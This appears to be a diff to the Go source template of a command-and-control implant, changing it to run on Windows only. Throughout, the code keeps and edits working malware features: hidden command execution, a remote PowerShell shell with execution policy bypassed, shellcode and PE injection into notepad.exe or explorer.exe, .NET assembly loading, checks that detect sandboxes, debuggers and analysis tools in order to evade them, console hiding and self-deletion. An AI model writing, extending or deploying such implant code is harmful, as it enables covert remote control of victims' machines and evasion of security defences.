@@ -768,10 +768,7 @@ func New{AGENT_STRUCT_NAME}(agentID, secretKey, c2URL, redirectorHost string, re
 	}
 
 	hostname, _ := os.Hostname()
-	username := os.Getenv("USER")
-	if username == "" {
-		username = os.Getenv("USERNAME")
-	}
+	username := os.Getenv("USERNAME")
 	if username == "" {
 		username = "unknown"
 	}
@@ -1066,166 +1063,14 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_SUBMIT_INTERACTIVE_RESULT_FUNC}(taskID, res
 func (a *{AGENT_STRUCT_NAME}) {AGENT_EXECUTE_FUNC}(command string) string {
 
 
-	commandLower := strings.ToLower(strings.TrimSpace(command))
-	isPowerShell := false
 
-	powerShellIndicators := []string{
-		"powershell", "pwsh", "powershell.exe",
-		"$", "get-", "set-", "new-", "remove-", "invoke-",
-		"select-", "where-", "foreach-", "out-", "export-",
-		"import-", "write-", "read-", "clear-", "update-",
-		"|", "get-wmiobject", "get-ciminstance", "start-process",
-		"get-service", "stop-service", "restart-service", "set-service",
+
+	// Use the hidden command execution function for Windows to prevent any console window flickering
+	result, err := executeCommandHidden(command)
+	if err != nil {
+		return fmt.Sprintf("[ERROR] Command execution failed: %v", err)
 	}
-
-	patternCount := 0
-	for _, pattern := range powerShellIndicators {
-		if strings.Contains(commandLower, pattern) {
-			patternCount++
-		}
-	}
-
-
-	isPowerShell = patternCount >= 2 ||
-		strings.Contains(commandLower, "get-wmiobject") ||
-		strings.Contains(commandLower, "get-ciminstance") ||
-		strings.Contains(commandLower, "start-process") ||
-		strings.Contains(commandLower, "powershell -")
-
-
-	if runtime.GOOS == "windows" {
-		// Use the hidden command execution function for Windows to prevent any console window flickering
-		result, err := executeCommandHidden(command)
-		if err != nil {
-			return fmt.Sprintf("[ERROR] Command execution failed: %v", err)
-		}
-		return result
-	} else {
-		// For non-Windows systems, use the standard execution with timeout and size limits
-		var cmd *exec.Cmd
-
-		if isPowerShell {
-			cmd = exec.Command("pwsh", "-Command", command)
-		} else {
-			cmd = exec.Command("sh", "-c", command)
-		}
-
-		// Create pipes to read output with size limits
-		stdoutPipe, err := cmd.StdoutPipe()
-		if err != nil {
-			return fmt.Sprintf("[ERROR] Failed to create stdout pipe: %v", err)
-		}
-
-		stderrPipe, err := cmd.StderrPipe()
-		if err != nil {
-			return fmt.Sprintf("[ERROR] Failed to create stderr pipe: %v", err)
-		}
-
-		// Start the command
-		if err := cmd.Start(); err != nil {
-			return fmt.Sprintf("[ERROR] Failed to start command: %v", err)
-		}
-
-		// Read stdout with size limit
-		stdoutChan := make(chan string)
-		go func() {
-			var stdoutBytes []byte
-			buffer := make([]byte, 4096)
-			totalRead := 0
-			const maxSize = 1024 * 1024 // 1MB limit - same as Windows version
-
-			for {
-				// Check if we've reached the size limit
-				if totalRead >= maxSize {
-					stdoutBytes = append(stdoutBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
-					break
-				}
-
-				n, err := stdoutPipe.Read(buffer)
-				if n > 0 {
-					// Check if adding this chunk would exceed our size limit
-					if totalRead + n > maxSize {
-						// Only add what fits within our limit
-						remaining := maxSize - totalRead
-						stdoutBytes = append(stdoutBytes, buffer[:remaining]...)
-						stdoutBytes = append(stdoutBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
-						break
-					}
-
-					stdoutBytes = append(stdoutBytes, buffer[:n]...)
-					totalRead += n
-				}
-				if err != nil {
-					break
-				}
-			}
-			stdoutChan <- string(stdoutBytes)
-		}()
-
-		// Read stderr with size limit
-		stderrChan := make(chan string)
-		go func() {
-			var stderrBytes []byte
-			buffer := make([]byte, 4096)
-			totalRead := 0
-			const maxSize = 1024 * 1024 // 1MB limit - same as Windows version
-
-			for {
-				// Check if we've reached the size limit
-				if totalRead >= maxSize {
-					stderrBytes = append(stderrBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
-					break
-				}
-
-				n, err := stderrPipe.Read(buffer)
-				if n > 0 {
-					// Check if adding this chunk would exceed our size limit
-					if totalRead + n > maxSize {
-						// Only add what fits within our limit
-						remaining := maxSize - totalRead
-						stderrBytes = append(stderrBytes, buffer[:remaining]...)
-						stderrBytes = append(stderrBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
-						break
-					}
-
-					stderrBytes = append(stderrBytes, buffer[:n]...)
-					totalRead += n
-				}
-				if err != nil {
-					break
-				}
-			}
-			stderrChan <- string(stderrBytes)
-		}()
-
-		// Wait for command completion with timeout
-		done := make(chan error, 1)
-		go func() {
-			done <- cmd.Wait()
-		}()
-
-		select {
-		case <-time.After(60 * time.Second): // 60 second timeout to match Windows version
-			if cmd.Process != nil {
-				cmd.Process.Kill()
-			}
-			return "[ERROR] Command execution timed out after 60 seconds"
-		case err := <-done:
-			if err != nil {
-				return fmt.Sprintf("[ERROR] Command execution failed: %v", err)
-			}
-		}
-
-		// Get the output from both channels
-		stdoutResult := <-stdoutChan
-		stderrResult := <-stderrChan
-
-		output := stdoutResult + stderrResult
-		if output == "" {
-			return "[Command executed successfully - no output]"
-		}
-		return output
-	}
+	return result
 }
 
 func (a *{AGENT_STRUCT_NAME}) {AGENT_SUBMIT_TASK_RESULT_FUNC}(taskID, result string) error {
@@ -1330,12 +1175,8 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_TTY_SHELL_FUNC}(command string) stri
 		}
 		defer conn.Close()
 
-		var cmd *exec.Cmd
-		if runtime.GOOS == "windows" {
-			cmd = exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-NoProfile", "-Command", "-")
-		} else {
-			cmd = exec.Command("bash", "-i")
-		}
+		// Only support PowerShell on Windows
+		cmd := exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-NoProfile", "-Command", "-")
 
 		stdin, err := cmd.StdinPipe()
 		if err != nil {
@@ -1442,9 +1283,6 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_BOF_FUNC}(command string) string {
 }
 
 func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_DOTNET_ASSEMBLY_FUNC}(command string) string {
-	if runtime.GOOS != "windows" {
-		return "[ERROR] .NET assembly execution is only supported on Windows"
-	}
 
 	parts := strings.SplitN(command, " ", 2)
 	if len(parts) < 2 {
@@ -1501,11 +1339,7 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_DOTNET_ASSEMBLY_FUNC}(command string
 }
 
 func (a *{AGENT_STRUCT_NAME}) {AGENT_GET_PROCESS_ID_FUNC}(processName string) (uint32, error) {
-	// Find process ID for the specified process name (only on Windows)
-	if runtime.GOOS != "windows" {
-		return 0, fmt.Errorf("process injection only supported on Windows")
-	}
-
+	// Find process ID for the specified process name (Windows only)
 	// Convert process name to lowercase for comparison
 	processName = strings.ToLower(processName)
 
@@ -1545,10 +1379,6 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_GET_PROCESS_ID_FUNC}(processName string) (u
 }
 
 func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_SHELLCODE_FUNC}(shellcode []byte) string {
-
-	if runtime.GOOS != "windows" {
-		return "[ERROR] Process injection only supported on Windows"
-	}
 
 	// Get target process ID (try notepad.exe first, then explorer.exe as fallback)
 	pid, err := a.{AGENT_GET_PROCESS_ID_FUNC}("notepad.exe")
@@ -1600,9 +1430,6 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_SHELLCODE_FUNC}(shellcode []byte) st
 }
 
 func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_PE_FUNC}(peData []byte) string {
-	if runtime.GOOS != "windows" {
-		return "[ERROR] PE injection only supported on Windows"
-	}
 
 	if len(peData) < 1024 { // Minimum size check
 		return "[ERROR] PE file too small to be valid"
@@ -1938,28 +1765,12 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_SANDBOX_FUNC}() bool {
 	}
 
 	var totalRAM uint64
-	if runtime.GOOS == "linux" {
-		if data, err := ioutil.ReadFile("/proc/meminfo"); err == nil {
-			lines := strings.Split(string(data), "\n")
-			for _, line := range lines {
-				if strings.HasPrefix(line, "MemTotal:") {
-					parts := strings.Fields(line)
-					if len(parts) >= 2 {
-						if kb, err := strconv.ParseUint(parts[1], 10, 64); err == nil {
-							totalRAM = kb * 1024 // Convert to bytes
-							break
-						}
-					}
-				}
-			}
-		}
-	} else if runtime.GOOS == "windows" {
-		if os.Getenv("VBOX_SHARED_FOLDERS") != "" ||
-		   os.Getenv("VBOX_SESSION") != "" ||
-		   strings.Contains(os.Getenv("COMPUTERNAME"), "SANDBOX") ||
-		   strings.Contains(os.Getenv("COMPUTERNAME"), "SND") {
-			return true
-		}
+	// Windows-specific sandbox checks
+	if os.Getenv("VBOX_SHARED_FOLDERS") != "" ||
+	   os.Getenv("VBOX_SESSION") != "" ||
+	   strings.Contains(os.Getenv("COMPUTERNAME"), "SANDBOX") ||
+	   strings.Contains(os.Getenv("COMPUTERNAME"), "SND") {
+		return true
 	}
 
 	if totalRAM > 0 && totalRAM < 2*1024*1024*1024 { // Less than 2GB
@@ -2008,14 +1819,8 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_SANDBOX_FUNC}() bool {
 		}
 	}
 
-	if runtime.GOOS == "linux" {
-		if a.{AGENT_CHECK_PROCESSES_FOR_SANDBOX_FUNC}() {
-			return true
-		}
-	} else if runtime.GOOS == "windows" {
-		if a.{AGENT_CHECK_WINDOWS_PROCESSES_FOR_SANDBOX_FUNC}() {
-			return true
-		}
+	if a.{AGENT_CHECK_WINDOWS_PROCESSES_FOR_SANDBOX_FUNC}() {
+		return true
 	}
 
 	currentPath, _ := os.Getwd()
@@ -2040,18 +1845,6 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_SANDBOX_FUNC}() bool {
 		}
 	}
 
-	if runtime.GOOS == "linux" {
-		if data, err := ioutil.ReadFile("/proc/uptime"); err == nil {
-			parts := strings.Fields(string(data))
-			if len(parts) > 0 {
-				if uptime, err := strconv.ParseFloat(parts[0], 64); err == nil {
-					if uptime < 300 { // Less than 5 minutes
-						return true
-					}
-				}
-			}
-		}
-	}
 
 	suspiciousFiles := []string{
 		"C:\\windows\\temp\\vmware_trace.log",  // VMware
@@ -2122,30 +1915,6 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_KILL_DATE_FUNC}() bool {
 	return now.After(killTime)
 }
 
-func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_PROCESSES_FOR_SANDBOX_FUNC}() bool {
-	cmd := exec.Command("ps", "aux")
-	output, err := cmd.Output()
-	if err != nil {
-		return false
-	}
-
-	processes := string(output)
-	sandboxProcesses := []string{
-		"cape", "fakenet", "wireshark", "tcpdump", "ollydbg",
-		"x32dbg", "x64dbg", "ida", "gdb", "devenv", "procmon",
-		"procexp", "sniff", "netmon", "apimonitor", "regmon",
-		"filemon", "immunity", "windbg", "fiddler",
-	}
-
-	for _, proc := range sandboxProcesses {
-		if strings.Contains(strings.ToLower(processes), proc) {
-			return true
-		}
-	}
-
-	return false
-}
-
 func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_WINDOWS_PROCESSES_FOR_SANDBOX_FUNC}() bool {
 	cmd := exec.Command("tasklist")
 	output, err := cmd.Output()
@@ -2178,23 +1947,13 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_NETWORK_TOOLS_FUNC}() bool {
 
 	var processes string
 
-	if runtime.GOOS == "linux" {
-		cmd := exec.Command("ps", "aux")
-		output, err := cmd.Output()
-		if err != nil {
-			return false
-		}
-		processes = string(output)
-	} else if runtime.GOOS == "windows" {
-		cmd := exec.Command("tasklist")
-		output, err := cmd.Output()
-		if err != nil {
-			return false
-		}
-		processes = string(output)
-	} else {
-		return false // Not supported on this platform
+	// Only support Windows platform
+	cmd := exec.Command("tasklist")
+	output, err := cmd.Output()
+	if err != nil {
+		return false
 	}
+	processes = string(output)
 
 	networkTools := []string{
 		"wireshark", "tcpdump", "tshark", "netsniff", "ettercap", "burp", "mitmproxy",
@@ -2217,36 +1976,12 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_DEBUGGERS_FUNC}() bool {
 		return false
 	}
 
-	if runtime.GOOS == "linux" {
-		statusPath := fmt.Sprintf("/proc/%d/status", os.Getpid())
-		if data, err := ioutil.ReadFile(statusPath); err == nil {
-			lines := strings.Split(string(data), "\n")
-			for _, line := range lines {
-				if strings.HasPrefix(line, "TracerPid:") {
-					parts := strings.Fields(line)
-					if len(parts) >= 2 {
-						pid := strings.TrimSpace(parts[1])
-						if pid != "0" {
-							return true // Being traced
-						}
-					}
-				}
-			}
-		}
+	if a.{AGENT_CHECK_WINDOWS_PROCESSES_FOR_DEBUGGERS_FUNC}() {
+		return true
 	}
 
-	if runtime.GOOS == "linux" {
-		if a.{AGENT_CHECK_PROCESSES_FOR_DEBUGGERS_FUNC}() {
-			return true
-		}
-	} else if runtime.GOOS == "windows" {
-		if a.{AGENT_CHECK_WINDOWS_PROCESSES_FOR_DEBUGGERS_FUNC}() {
-			return true
-		}
-
-		if a.{AGENT_CHECK_WINDOWS_DEBUGGER_FUNC}() {
-			return true
-		}
+	if a.{AGENT_CHECK_WINDOWS_DEBUGGER_FUNC}() {
+		return true
 	}
 
 	start := time.Now()
@@ -2255,28 +1990,6 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_DEBUGGERS_FUNC}() bool {
 	expectedSleep := 10 * time.Millisecond
 	if actualSleep < expectedSleep/2 || actualSleep > expectedSleep*2 {
 		return true
-	}
-
-	return false
-}
-
-func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_PROCESSES_FOR_DEBUGGERS_FUNC}() bool {
-	cmd := exec.Command("ps", "aux")
-	output, err := cmd.Output()
-	if err != nil {
-		return false
-	}
-
-	processes := string(output)
-	debuggerProcesses := []string{
-		"gdb", "gdbserver", "ollydbg", "x32dbg", "x64dbg", "ida", "windbg",
-		"immunity", "devenv", "vsdebug", "msvsmon", "apimonitor", "regmon", "filemon",
-	}
-
-	for _, dbg := range debuggerProcesses {
-		if strings.Contains(strings.ToLower(processes), dbg) {
-			return true
-		}
 	}
 
 	return false
@@ -2389,7 +2102,6 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_SELF_DELETE_FUNC}() {
 	go func() {
 		time.Sleep(100 * time.Millisecond) // Brief delay to ensure process exits
 
-		if runtime.GOOS == "windows" {
 			psCommand := fmt.Sprintf(`
 				Start-Sleep -Milliseconds 500;
 				$targetPath = '%s';
@@ -2412,9 +2124,6 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_SELF_DELETE_FUNC}() {
 
 			cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", psCommand)
 			cmd.Start()
-		} else {
-			os.Remove(executable)
-		}
 
 		os.Exit(0)
 	}()
@@ -2422,26 +2131,22 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_SELF_DELETE_FUNC}() {
 
 func {AGENT_HIDE_CONSOLE_FUNC}() {
 	// Hide console window on Windows using direct Windows API calls for immediate effect
-	if runtime.GOOS == "windows" {
-		// Method 1: Use ShowWindow to hide the console window
-		consoleHandle, _, _ := procGetConsoleWindow.Call()
-		if consoleHandle != 0 {
-			procShowWindow.Call(
-				consoleHandle,  // HWND - console window handle
-				uintptr(0),     // nCmdShow - SW_HIDE constant
-			)
-		}
-
-		// Method 2: Free the console to completely detach from the parent process
-		procFreeConsole.Call()
+	// Method 1: Use ShowWindow to hide the console window
+	consoleHandle, _, _ := procGetConsoleWindow.Call()
+	if consoleHandle != 0 {
+		procShowWindow.Call(
+			consoleHandle,  // HWND - console window handle
+			uintptr(0),     // nCmdShow - SW_HIDE constant
+		)
 	}
+
+	// Method 2: Free the console to completely detach from the parent process
+	procFreeConsole.Call()
 }
 
 func main() {
-	// Hide console if on Windows
-	if runtime.GOOS == "windows" {
-		{AGENT_HIDE_CONSOLE_FUNC}()
-	}
+	// Hide console for Windows
+	{AGENT_HIDE_CONSOLE_FUNC}()
 
 	agentID := "{AGENT_ID}"
 	secretKey := "{SECRET_KEY}"
